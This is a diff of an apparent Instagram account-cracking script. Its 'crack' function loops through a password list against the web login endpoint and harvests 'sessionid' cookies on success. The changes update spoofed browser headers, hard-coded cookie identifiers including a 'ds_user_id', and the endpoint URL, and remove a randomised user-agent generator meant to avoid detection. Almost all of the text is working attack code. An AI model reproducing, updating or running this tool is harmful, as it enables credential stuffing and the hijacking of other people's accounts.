@@ -102,55 +102,61 @@ def crack(uid, password_list, total_count):
             sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
             sys.stdout.flush()
             
-            # Create session and generate device hash    uid   "#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)
+            # Create session and generate device hash    uid   "#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)  str(uuid.uuid4()).upper(),
             session = requests.Session()
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             cookies = {
-            'csrftoken': csrftoken,
-            'datr': 'SehHaXwOCk9GiWPH3fNZWglz',
+            'datr': 'lIB4aBrfVthN1_tPJkP4FZik',
             'ig_did': str(uuid.uuid4()).upper(),
-            'mid': 'aUfoSwALAAG_fJ1ItrV9b-sb7DCg',
+            'mid': 'aHiAlAALAAGaod0oZfM950AkBwnm',
             'ig_nrcb': '1',
-            'wd': '1136x773',}
+            'ps_l': '1',
+            'ps_n': '1',
+            'csrftoken': csrftoken,
+            'ds_user_id': '75581063753',
+            'wd': '1440x828',}
             headers = {
-            'Host': 'i.instagram.com',
-            'content-length': '1212',
-            'sec-ch-ua': '""Not/A)Brand";v="99", "Samsung Internet";v="23.0", "Chromium";v="115"',
-            'x-ig-app-id': '1217981644879628',
-            'x-ig-www-claim': 'hmac.AR3mzTXmWJQaei0IjdtQkJIZZIkfif5qOU0tUpKo_5EceiMR',
-            'sec-ch-ua-mobile': '?1',
-            'x-instagram-ajax': '1010361788',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-S906U1 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.124 Mobile Safari/537.36 Instagram 408.0.0.0.45 Android (35/15; 450dpi; 1080x2340; samsung; SM-S906U1; g0q; qcom; es_LA; 827194262; IABMV/1)',
-            'viewport-width': '421',
-            'content-type': 'application/x-www-form-urlencoded',
             'accept': '*/*',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-asbd-id': '129477',
-            'x-csrftoken': csrftoken,
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua-platform': '"Android"',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://www.instagram.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
+            'pragma': 'no-cache',
+            'priority': 'u=1, i',
+            'referer': 'https://www.instagram.com/?utm_source=pwa_homescreen&__pwa=1',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Microsoft Edge";v="144"',
+            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="8.0.0.0", "Chromium";v="144.0.7559.31", "Microsoft Edge";v="144.0.3719.59"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'empty',
-            'referer': 'https://www.instagram.com/accounts/login/?force_authentication=1&platform_app_id=532380490911317&next=%2Foauth%2Foidc%2F%3Fredirect_uri%3Dhttps%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Floginpage%2Figoidc%2Fcallback%2Fidtoken%2F%26app_id%3D532380490911317%26response_type%3Dcode%26scope%3Dopenid%26state%3D%257B%2522user_nonce%2522%3A%2522ATA63NIXdVjGuo6UmFDDBPmukpm-ez8r6ccRg00P03dRb3KYqT6N-2VgaI7OvOggwrGpVlMVDp_a3jEpsPryb3gw1Bp0qGkzWAYsf2Cg%2522%2C%2522from_ig_login_upsell_sso%2522%3Anull%2C%2522login_source%2522%3A%2522fbs_web_landing_page%2522%2C%2522next%2522%3A%2522%255Cu00252F%255Cu00253Fnav_ref%255Cu00253Dbizweb_landing_ig_login_button%255Cu002526biz_login_source%255Cu00253Dbizweb_landing_login_ig_oidc_w_pc_login_button%2522%2C%2522require_professional%2522%3Atrue%2C%2522create_business_manager%2522%3Atrue%257D',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0',
+            'x-asbd-id': '359341',
+            'x-csrftoken': csrftoken,
+            'x-ig-app-id': '936619743392459',
+            'x-ig-www-claim': '0',
+            'x-instagram-ajax': '1031856633',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-web-session-id': 'fwiqvz:2pbcbw:i90kb6',}
             data = {
             'enc_password': enc_password,
             'caaF2DebugGroup': '0',
             'isPrivacyPortalReq': 'false',
             'loginAttemptSubmissionCount': '0',
             'optIntoOneTap': 'false',
-            'queryParams': '{"flo":"true"}',
+            'queryParams': '{"utm_source":"pwa_homescreen","__pwa":"1"}',
             'trustedDeviceRecords': '{}',
             'username': uid,
-            'jazoest': '22898',}
+            'jazoest': '22713',}
             # Make API request
-            response = session.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
+            response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = session.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
@@ -196,49 +202,6 @@ def crack(uid, password_list, total_count):
         return False
     
     return False
-
-def AppUac():
-
-    devices = {
-        "Samsung": [
-            {"model": "SM-A127F", "chipset": "exynos850", "res": "720x1600", "dpi": "320dpi"},
-            {"model": "SM-M215F", "chipset": "mt6769", "res": "720x1600", "dpi": "320dpi"},
-            {"model": "SM-G991B", "chipset": "exynos2100", "res": "1080x2400", "dpi": "420dpi"},
-        ],
-        "Xiaomi": [
-            {"model": "Redmi Note 9", "chipset": "mt6768", "res": "1080x2340", "dpi": "440dpi"},
-            {"model": "Redmi Note 10", "chipset": "sm6150", "res": "1080x2400", "dpi": "440dpi"},
-        ],
-        "Vivo": [
-            {"model": "V2026", "chipset": "mt6769", "res": "720x1600", "dpi": "320dpi"},
-            {"model": "V2140", "chipset": "sm4350", "res": "1080x2408", "dpi": "440dpi"},
-        ],
-        "Realme": [
-            {"model": "RMX2020", "chipset": "sm7125", "res": "1080x2400", "dpi": "440dpi"},
-            {"model": "RMX3085", "chipset": "mt6769", "res": "720x1600", "dpi": "320dpi"},
-        ]
-    }
-
-    brand = random.choice(list(devices.keys()))
-    device = random.choice(devices[brand])
-
-    android_version = random.choice(["11", "12", "13", "14", "15"])
-    sdk_map = {"11": "30", "12": "31", "13": "33", "14": "34", "15": "35"}
-    lang = random.choice(["en_US", "id_ID", "es_ES", "pt_BR"])
-
-    ig_version = f"{random.randint(380, 410)}.0.0.{random.randint(10, 60)}.{random.randint(80, 150)}"
-    build_id = random.randint(700000000, 900000000)
-
-    user_agent = (
-        f"Instagram {ig_version} Android "
-        f"({sdk_map[android_version]}/{android_version}; "
-        f"{device['dpi']}; {device['res']}; "
-        f"{brand.lower()}; {device['model']}; "
-        f"{device['model'].lower()}; {device['chipset']}; "
-        f"{lang}; {build_id})"
-    )
-
-    return user_agent
 
 def generate_random_ids(limit):
     """Generate random 6-digit IDs"""
